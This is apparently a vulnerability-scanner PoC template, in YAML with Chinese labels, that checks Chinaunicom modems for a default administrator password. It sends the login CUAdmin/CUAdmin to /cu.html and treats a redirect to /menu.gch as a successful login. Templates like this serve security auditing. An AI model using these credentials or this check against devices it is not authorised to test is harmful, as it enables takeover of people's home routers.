id: poc-yaml-chinaunicom-modem-default-password
info:
  name: Chinaunicom Modem 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Chinaunicom Modem
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /cu.html
  headers: {}
  data: frashnum=&action=login&Frm_Logintoken=1&Username=CUAdmin&Password=CUAdmin&Username=&Password=
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 302 && contains(headers, "location") && contains(headers,
    "/menu.gch")
  output: []
